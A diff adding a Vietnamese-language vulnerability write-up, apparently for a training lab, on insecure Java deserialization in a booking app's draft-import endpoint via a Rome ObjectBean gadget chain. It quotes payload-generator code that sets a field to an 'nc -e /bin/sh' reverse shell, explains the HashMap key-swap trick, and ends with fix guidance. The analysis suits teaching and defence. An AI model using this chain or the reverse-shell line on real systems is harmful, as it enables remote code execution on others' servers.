@@ -3913,3 +3913,583 @@ Poison Freemarker payload vào access log
 
 ***
 
+## 1. Kết luận nhanh cho Insecure Deserialization
+
+| Thuộc tính | Giá trị |
+|---|---|
+| Entry point | `POST /api/v1/booking/draft/import` |
+| Quyền truy cập | `ROLE_USER` hoặc `ROLE_ADMIN` |
+| Content-Type | `application/octet-stream` |
+| Frontend source | Upload file `.ser` ở `BookingHistory.jsx` |
+| Controller source | `@RequestBody byte[] draftBytes` |
+| Sink chính | `ObjectInputStream.readObject()` |
+| Gadget chain | Rome `1.0` - `com.sun.syndication.feed.impl.ObjectBean` |
+| Trigger container | `HashMap` key rehash trong quá trình deserialize |
+| Getter bị kích hoạt | `BookingRequest.getQrCode()` |
+| Hidden final sink | `QRCodeHelper.renderQrCode(...)` -> `/bin/sh -c` |
+| Lý do guard business không chặn được | `/draft/import` nhận raw bytes, không đi qua `rejectUnsafeBusinessPromotionCode(...)` |
+
+> **Nhận định:** lỗ hổng Deserialize nằm ở chức năng import booking draft. Endpoint nhận raw serialized bytes rồi gọi `ObjectInputStream.readObject()` trước mọi kiểm tra kiểu dữ liệu. Rome `ObjectBean` được dùng vì gadget này có thể ép JavaBean gọi getter của object đích. Trong WebLab, getter nguy hiểm là `BookingRequest.getQrCode()`, vì getter này tạo QR và đi tiếp vào `QRCodeHelper`, nơi có command sink ẩn.
+
+***
+
+## 2. Bản đồ flow tổng quan
+
+```mermaid
+flowchart TD
+    subgraph Frontend["Frontend"]
+        A1["BookingHistory.jsx"]
+        A2["Upload .ser draft file"]
+        A3["importBookingDraft(file)"]
+    end
+
+    subgraph API["API layer"]
+        B1["POST /api/v1/booking/draft/import"]
+        B2["@RequestBody byte[] draftBytes"]
+        B3["Authentication -> userId"]
+    end
+
+    subgraph Service["Service layer"]
+        C1["BookingServiceImpl.importDraft(draftBytes, userId)"]
+        C2["new ObjectInputStream(new ByteArrayInputStream(draftBytes))"]
+        C3(("input.readObject()"))
+        C4["type check: importedDraft instanceof BookingRequest"]
+    end
+
+    subgraph Gadget["Rome gadget chain"]
+        D1["HashMap.readObject()"]
+        D2["Rehash serialized key"]
+        D3["ObjectBean.hashCode()"]
+        D4["EqualsBean.beanHashCode()"]
+        D5["inner ObjectBean.toString()"]
+        D6["ToStringBean invokes JavaBean getters"]
+    end
+
+    subgraph Impact["Application impact"]
+        E1["BookingRequest.getQrCode()"]
+        E2["buildQrCodeContent() includes promotionCode"]
+        E3["QRCodeHelper.renderQrCode(qrContent)"]
+        E4["Runtime.exec(['/bin/sh','-c',command])"]
+    end
+
+    A1 --> A2 --> A3 --> B1 --> B2 --> B3 --> C1 --> C2 --> C3
+    C3 --> D1 --> D2 --> D3 --> D4 --> D5 --> D6 --> E1 --> E2 --> E3 --> E4
+    C3 --> C4
+```
+
+***
+
+## 3. Sink -> Source
+
+### 3.1. Fuzz dangerous function để tìm sink candidate
+
+Với Deserialize, các handle quan trọng là native serialization APIs, raw byte endpoints, gadget dependencies và side-effect getters.
+
+| Nhóm dangerous function / signal | Pattern fuzz trong code | Candidate tìm thấy | Kết luận |
+|---|---|---|---|
+| Native Java deserialize | `ObjectInputStream`, `readObject` | `BookingServiceImpl.importDraft(...)` | Sink chính |
+| Native Java serialize | `ObjectOutputStream`, `writeObject` | `BookingServiceImpl.saveDraft(...)` | Business feature tạo `.ser` hợp lệ |
+| Raw byte source | `application/octet-stream`, `byte[]` | `BookingController.importDraft(...)` | Source không qua JSON validation |
+| Serializable payload | `implements Serializable` | `BookingRequest implements Serializable` | Object business có thể nằm trong graph |
+| Gadget dependency | `rome`, `ObjectBean` | `rome:rome:1.0` trong `pom.xml` | Rome gadget chain khả dụng |
+| Getter side effect | `getQrCode`, `renderQrCode` | `BookingRequest.getQrCode()` | Getter không thuần, có side effect |
+| Hidden command sink | `Runtime.exec`, `/bin/sh -c` | `QRCodeHelper.renderQrCode(...)` | Impact cuối của chain |
+
+### 3.2. Sink `ObjectInputStream.readObject()`
+
+Sink chính:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+Object importedDraft;
+try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(draftBytes))) {
+    importedDraft = input.readObject();
+}
+```
+
+Điểm nguy hiểm:
+
+| Dòng xử lý | Ý nghĩa bảo mật |
+|---|---|
+| `new ObjectInputStream(...)` | Khởi tạo native Java deserializer trên bytes do client upload |
+| `input.readObject()` | Rehydrate object graph và có thể gọi `readObject`, `hashCode`, `equals`, `toString` trong gadget |
+| `importedDraft instanceof BookingRequest` nằm sau sink | Type-check xảy ra quá muộn, side effect đã chạy trong lúc deserialize |
+
+`instanceof` phía sau không bảo vệ được:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+if (importedDraft instanceof BookingRequest bookingRequest) {
+    result.put("quote", quote(bookingRequest, userId));
+}
+```
+
+Với payload Rome, object root có thể là `HashMap`, không phải `BookingRequest`. Service vẫn có thể trả `draftType = java.util.HashMap`, nhưng gadget side effect đã xảy ra trước khi nhánh `instanceof` được xét.
+
+### 3.3. Truy ngược source từ sink
+
+Controller nhận raw bytes:
+
+```java
+// File: src/main/java/org/example/controller/BookingController.java
+@PostMapping(value = "/draft/import", consumes = MediaType.APPLICATION_OCTET_STREAM_VALUE)
+public ResponseEntity<?> importDraft(@RequestBody byte[] draftBytes, Authentication authentication) {
+    Integer userId = getAuthenticatedUserId(authentication);
+    return ResponseEntity.ok().body(bookingService.importDraft(draftBytes, userId));
+}
+```
+
+Frontend gửi file `.ser`:
+
+```javascript
+// File: frontend/src/services/api.js
+export const importBookingDraft = (file) => api.post('/booking/draft/import', file, {
+  headers: {
+    'Content-Type': 'application/octet-stream',
+  },
+});
+```
+
+UI import draft:
+
+```jsx
+// File: frontend/src/pages/BookingHistory.jsx
+<input
+  type="file"
+  accept=".ser,application/octet-stream"
+  className="hidden"
+  onChange={handleImportDraft}
+/>
+```
+
+Trace sink -> source:
+
+```mermaid
+flowchart RL
+    S1["ObjectInputStream.readObject()"]
+    S2["new ByteArrayInputStream(draftBytes)"]
+    S3["BookingServiceImpl.importDraft(draftBytes, userId)"]
+    S4["BookingController.importDraft(@RequestBody byte[])"]
+    S5["POST /api/v1/booking/draft/import"]
+    S6["frontend importBookingDraft(file)"]
+    S7["User uploads .ser file"]
+
+    S1 --> S2 --> S3 --> S4 --> S5 --> S6 --> S7
+```
+
+### 3.4. Vì sao dùng được Rome chain
+
+Repo có dependency Rome `1.0`:
+
+```xml
+<!-- File: pom.xml -->
+<dependency>
+    <groupId>rome</groupId>
+    <artifactId>rome</artifactId>
+    <version>1.0</version>
+</dependency>
+```
+
+Rome `ObjectBean` là gadget phù hợp vì nó wrap một object rồi implement `hashCode()`, `equals()` và `toString()` bằng cơ chế JavaBean introspection.
+
+Cấu trúc quan trọng trong Rome:
+
+```java
+// File: dependency rome:rome:1.0 - com.sun.syndication.feed.impl.ObjectBean
+public int hashCode() {
+    return _equalsBean.beanHashCode();
+}
+
+public String toString() {
+    return _toStringBean.toString();
+}
+```
+
+`EqualsBean.beanHashCode()` gọi `toString()` của object đang được wrap:
+
+```java
+// File: dependency rome:rome:1.0 - com.sun.syndication.feed.impl.EqualsBean
+public int beanHashCode() {
+    return _obj.toString().hashCode();
+}
+```
+
+`ToStringBean.toString()` introspect JavaBean properties rồi gọi read method/getter:
+
+```java
+// File: dependency rome:rome:1.0 - com.sun.syndication.feed.impl.ToStringBean
+PropertyDescriptor[] descriptors = BeanIntrospector.getPropertyDescriptors(_beanClass);
+Method readMethod = descriptor.getReadMethod();
+Object value = readMethod.invoke(_obj, NO_PARAMS);
+```
+
+Vì `BookingRequest` có getter `getQrCode()`, JavaBean introspection xem đây là property `qrCode`:
+
+```java
+// File: src/main/java/org/example/payload/BookingRequest.java
+@JsonIgnore
+public String getQrCode() {
+    return new QRCodeHelper().renderQrCode(buildQrCodeContent());
+}
+```
+
+`@JsonIgnore` chỉ chặn Jackson JSON serialization. Nó không chặn JavaBeans/Rome introspection, nên Rome vẫn có thể gọi `getQrCode()`.
+
+### 3.5. Vì sao payload dùng `HashMap` và double `ObjectBean`
+
+Generator trong repo tạo chain như sau:
+
+```java
+// File: Payload/ModernRomePayloadGenerator.java
+BookingRequest bookingRequest = new BookingRequest();
+bookingRequest.setTransactionIds(Collections.singletonList(transactionId));
+bookingRequest.setPromotionCode("; nc -e /bin/sh " + host + " " + port + " #");
+
+ObjectBean innerObjectBean = new ObjectBean(BookingRequest.class, bookingRequest);
+ObjectBean outerObjectBean = new ObjectBean(ObjectBean.class, innerObjectBean);
+
+HashMap<Object, Object> payload = new HashMap<>();
+payload.put("placeholder", "value");
+replaceFirstHashMapKey(payload, outerObjectBean);
+```
+
+Lý do từng lớp:
+
+| Thành phần | Vai trò |
+|---|---|
+| `HashMap` | Khi deserialize, `HashMap.readObject()` rebuild bucket và tính hash của key |
+| `outerObjectBean` làm key | Khi HashMap tính hash, gọi `outerObjectBean.hashCode()` |
+| `outerObjectBean.hashCode()` | Vào `EqualsBean.beanHashCode()` rồi gọi `innerObjectBean.toString()` |
+| `innerObjectBean.toString()` | Vào `ToStringBean`, introspect `BookingRequest` |
+| `BookingRequest.getQrCode()` | Getter bị gọi trong quá trình introspection |
+| `QRCodeHelper.renderQrCode(...)` | Tạo side effect qua command sink |
+
+Double `ObjectBean` là điểm quan trọng:
+
+```text
+Nếu chỉ dùng ObjectBean(BookingRequest.class, bookingRequest) làm HashMap key:
+hashCode() -> bookingRequest.toString().hashCode()
+=> thường chỉ gọi Object.toString(), không gọi getter.
+
+Khi bọc thêm outer ObjectBean:
+outer.hashCode() -> inner.toString()
+inner.toString() -> ToStringBean introspection -> BookingRequest.getQrCode()
+=> getter side effect được kích hoạt.
+```
+
+`replaceFirstHashMapKey(...)` dùng reflection để thay key sau khi map đã tạo:
+
+```java
+// File: Payload/ModernRomePayloadGenerator.java
+Field tableField = HashMap.class.getDeclaredField("table");
+tableField.setAccessible(true);
+Object[] table = (Object[]) tableField.get(map);
+
+Field keyField = node.getClass().getDeclaredField("key");
+keyField.setAccessible(true);
+keyField.set(node, newKey);
+```
+
+Lý do phải thay key bằng reflection:
+
+| Nếu `payload.put(outerObjectBean, value)` trực tiếp | `HashMap.put(...)` sẽ gọi `hashCode()` ngay lúc generate payload, làm chain nổ trên máy attacker |
+|---|---|
+| Nếu put placeholder rồi swap key | Tránh trigger trong generator; chỉ trigger khi target deserialize và rehash |
+
+Trên Java mới, script phải mở module `java.util` để reflection vào `HashMap.table`:
+
+```bash
+# File: Payload/gen-modern-rome-payload.sh
+java --add-opens java.base/java.util=ALL-UNNAMED \
+  -cp "$GENERATOR_CLASSES:$PROJECT_CP" \
+  ModernRomePayloadGenerator "$HOST" "$PORT" "$OUTPUT" "$TRANSACTION_ID"
+```
+
+### 3.6. Truy ngược từ `getQrCode()` tới hidden command sink
+
+Getter side effect:
+
+```java
+// File: src/main/java/org/example/payload/BookingRequest.java
+@JsonIgnore
+public String getQrCode() {
+    return new QRCodeHelper().renderQrCode(buildQrCodeContent());
+}
+```
+
+Payload field được dùng để dựng QR content:
+
+```java
+// File: src/main/java/org/example/payload/BookingRequest.java
+private String buildQrCodeContent() {
+    String promotionPart = promotionCode == null || promotionCode.isBlank()
+            ? "NO_PROMOTION"
+            : promotionCode.trim();
+    return orderPart + "+" + transactionPart + "+" + promotionPart;
+}
+```
+
+`promotionCode` trong serialized object graph không đi qua controller guard:
+
+```java
+// File: src/main/java/org/example/controller/BookingController.java
+@PostMapping(value = "/draft/import", consumes = MediaType.APPLICATION_OCTET_STREAM_VALUE)
+public ResponseEntity<?> importDraft(@RequestBody byte[] draftBytes, Authentication authentication) {
+    return ResponseEntity.ok().body(bookingService.importDraft(draftBytes, userId));
+}
+```
+
+Trong khi guard này chỉ nằm ở các JSON business endpoint như `/quote`, `/hold`, `/confirm`:
+
+```java
+// File: src/main/java/org/example/controller/BookingController.java
+private void rejectUnsafeBusinessPromotionCode(BookingRequest request) {
+    if (request == null || request.getPromotionCode() == null) {
+        return;
+    }
+    if (!SAFE_BUSINESS_PROMOTION_CODE.matcher(request.getPromotionCode()).matches()) {
+        throw new IllegalArgumentException("Invalid promotion code");
+    }
+}
+```
+
+***
+
+## 4. Source -> Sink
+
+### 4.1. Normal draft source -> sink
+
+Luồng nghiệp vụ hợp lệ:
+
+```mermaid
+sequenceDiagram
+    actor User
+    participant FE as FlightConfirm.jsx
+    participant SaveAPI as POST /api/v1/booking/draft/save
+    participant Service as BookingServiceImpl
+    participant OOS as ObjectOutputStream
+    participant File as booking-draft.ser
+    participant ImportAPI as POST /api/v1/booking/draft/import
+    participant OIS as ObjectInputStream
+
+    User->>FE: Save booking draft
+    FE->>SaveAPI: JSON BookingRequest
+    SaveAPI->>Service: saveDraft(request)
+    Service->>OOS: writeObject(request)
+    OOS-->>File: booking-draft.ser
+    User->>ImportAPI: Upload .ser draft
+    ImportAPI->>Service: importDraft(draftBytes,userId)
+    Service->>OIS: readObject()
+    OIS-->>Service: BookingRequest object
+```
+
+Luồng này cho thấy vì sao feature tồn tại: app chủ động xuất `.ser` rồi nhập lại. Vấn đề là import endpoint tin mọi `.ser` client upload, không xác thực provenance của draft file và không filter class trước `readObject()`.
+
+### 4.2. Attacker source -> Rome gadget -> getter side effect
+
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant Gen as ModernRomePayloadGenerator
+    participant Payload as payload.ser
+    participant Import as POST /api/v1/booking/draft/import
+    participant OIS as ObjectInputStream
+    participant HM as HashMap
+    participant Outer as outer ObjectBean
+    participant Inner as inner ObjectBean
+    participant Req as BookingRequest
+    participant QR as QRCodeHelper
+    participant Shell as /bin/sh -c
+
+    Attacker->>Gen: Build BookingRequest with promotionCode payload
+    Gen->>Gen: inner = ObjectBean(BookingRequest.class, bookingRequest)
+    Gen->>Gen: outer = ObjectBean(ObjectBean.class, inner)
+    Gen->>Gen: Replace HashMap key with outer ObjectBean
+    Gen-->>Payload: serialized HashMap
+    Attacker->>Import: Upload payload.ser
+    Import->>OIS: readObject()
+    OIS->>HM: HashMap.readObject()
+    HM->>Outer: hashCode()
+    Outer->>Inner: _obj.toString()
+    Inner->>Req: ToStringBean invokes getQrCode()
+    Req->>QR: renderQrCode(buildQrCodeContent())
+    QR->>Shell: qrencode command with promotionCode
+```
+
+Key point:
+
+| Step | Tại sao chain chạy? |
+|---|---|
+| `ObjectInputStream.readObject()` | Java deserialize tự gọi logic của object graph |
+| `HashMap.readObject()` | HashMap phải rebuild bucket nên tính hash key |
+| `ObjectBean.hashCode()` | Rome implement hash bằng `EqualsBean.beanHashCode()` |
+| `EqualsBean.beanHashCode()` | Gọi `_obj.toString().hashCode()` |
+| `inner ObjectBean.toString()` | Rome `ToStringBean` gọi JavaBean getters |
+| `BookingRequest.getQrCode()` | Getter có side effect tạo QR |
+| `QRCodeHelper` | Ghép input vào shell command |
+
+### 4.3. Detect signals
+
+| Signal | Ý nghĩa |
+|---|---|
+| Response trả `status = DRAFT_IMPORTED` và `draftType = java.util.HashMap` | Root object đã deserialize, dù không phải `BookingRequest` |
+| Reverse/OOB callback từ payload | Getter -> QRCodeHelper -> shell side effect đã chạy |
+| Delay khi payload dùng `sleep` | Time-based signal cho hidden sink |
+| File marker được tạo trong container | Side effect command chạy thành công |
+| Server trả lỗi import nhưng side effect vẫn có | Gadget có thể chạy trước khi exception propagate |
+
+Ví dụ generator hiện có trong repo:
+
+```bash
+# File: Payload/gen-modern-rome-payload.sh
+./Payload/gen-modern-rome-payload.sh <port> [host] [output.ser] [transactionId]
+```
+
+Khi chạy thành công, generator in ra QR content sẽ đi vào command sink:
+
+```text
+Command content: <transactionId>+; nc -e /bin/sh <host> <port> #
+```
+
+### 4.4. Vì sao Deserialize là lỗ hổng riêng, không chỉ là Command Injection
+
+| Tiêu chí | Deserialize | Command Injection hidden sink |
+|---|---|---|
+| Root cause | Native Java deserialize untrusted bytes | Ghép `qrContent` vào shell command |
+| Sink chính cần detect | `ObjectInputStream.readObject()` | `Runtime.exec(["/bin/sh","-c",command])` |
+| Gadget | Rome `ObjectBean` + `HashMap` | Không cần gadget nếu input vào thẳng helper |
+| Điểm bypass guard | Raw `.ser` không qua JSON/controller guard | Helper nhận `promotionCode` đã nằm trong object graph |
+| Evidence độc lập | `readObject()` rehydrate object graph và trigger getter | Side effect command chỉ là impact cuối |
+
+***
+
+## 5. Fix guidance đặt cạnh sink
+
+### 5.1. Thay native Java serialization bằng JSON draft
+
+Không xuất/nhập `.ser` cho browser. Draft nên là JSON DTO có schema rõ ràng:
+
+```java
+// File: src/main/java/org/example/controller/BookingController.java
+@PostMapping(value = "/draft/import", consumes = MediaType.APPLICATION_JSON_VALUE)
+public ResponseEntity<?> importDraft(@Valid @RequestBody BookingRequest draft,
+                                     Authentication authentication) {
+    Integer userId = getAuthenticatedUserId(authentication);
+    rejectUnsafeBusinessPromotionCode(draft);
+    return ResponseEntity.ok().body(bookingService.quote(draft, userId));
+}
+```
+
+Service không dùng `ObjectInputStream`:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+public Map<String, Object> importDraft(BookingRequest draft, Integer userId) {
+    Map<String, Object> result = new LinkedHashMap<>();
+    result.put("status", "DRAFT_IMPORTED");
+    result.put("draftType", BookingRequest.class.getName());
+    result.put("quote", quote(draft, userId));
+    return result;
+}
+```
+
+### 5.2. Nếu bắt buộc giữ native serialization, đặt `ObjectInputFilter` trước `readObject()`
+
+Filter phải set trước khi gọi `readObject()`:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(draftBytes))) {
+    ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
+            "maxbytes=8192;maxdepth=8;"
+                    + "org.example.payload.BookingRequest;"
+                    + "java.util.ArrayList;java.util.Collections$SingletonList;"
+                    + "java.lang.Integer;java.lang.String;!*");
+    input.setObjectInputFilter(filter);
+
+    Object importedDraft = input.readObject();
+    if (!(importedDraft instanceof BookingRequest bookingRequest)) {
+        throw new IllegalArgumentException("Invalid booking draft type");
+    }
+}
+```
+
+### 5.3. Làm getter side-effect free
+
+Không tạo QR trong getter. Getter có thể bị gọi bởi Jackson, Freemarker, JavaBeans, Rome hoặc debugger.
+
+```java
+// File: src/main/java/org/example/payload/BookingRequest.java
+@JsonIgnore
+public String buildQrCodeContentForService() {
+    return buildQrCodeContent();
+}
+```
+
+QR phải được tạo ở service sau validation:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+validateBookingRequest(request);
+String qrContent = request.buildQrCodeContentForService();
+String qrCode = qrCodeService.renderValidatedQrCode(qrContent);
+```
+
+### 5.4. Validate draft sau deserialize và trước business flow
+
+Ngay cả sau khi đổi sang JSON hoặc đặt filter, business fields vẫn phải validate lại:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+private void validateImportedDraft(BookingRequest request) {
+    if (request == null || request.getTransactionIds() == null || request.getTransactionIds().isEmpty()) {
+        throw new IllegalArgumentException("transactionIds is required");
+    }
+    if (request.getPromotionCode() != null
+            && !SAFE_BUSINESS_PROMOTION_CODE.matcher(request.getPromotionCode()).matches()) {
+        throw new IllegalArgumentException("Invalid promotion code");
+    }
+}
+```
+
+### 5.5. Dependency hygiene
+
+Nếu Rome không còn dùng cho tính năng business, gỡ dependency gadget khỏi classpath:
+
+```xml
+<!-- File: pom.xml -->
+<!-- Remove unused gadget-prone dependency if the application does not need RSS/Atom Rome APIs. -->
+<!--
+<dependency>
+    <groupId>rome</groupId>
+    <artifactId>rome</artifactId>
+    <version>1.0</version>
+</dependency>
+-->
+```
+
+***
+
+## 6. Tổng kết Deserialize
+
+Deserialize flow cần được ghi nhận là lỗ hổng riêng:
+
+```text
+POST /api/v1/booking/draft/import
+-> raw byte[] draftBytes
+-> ObjectInputStream.readObject()
+-> HashMap.readObject() rehash key
+-> Rome outer ObjectBean.hashCode()
+-> inner ObjectBean.toString()
+-> ToStringBean JavaBean introspection
+-> BookingRequest.getQrCode()
+-> QRCodeHelper.renderQrCode(...)
+```
+
+Rome được dùng được vì:
+
+1. `rome:rome:1.0` có trên classpath.
+2. `ObjectBean.hashCode()` và `ObjectBean.toString()` có thể kích hoạt logic introspection.
+3. `HashMap` tự gọi `hashCode()` của key khi deserialize.
+4. `BookingRequest` có getter `getQrCode()` không thuần và getter này gọi QR helper.
+5. Type-check sau `readObject()` không thể ngăn side effect đã xảy ra trong quá trình dựng object graph.
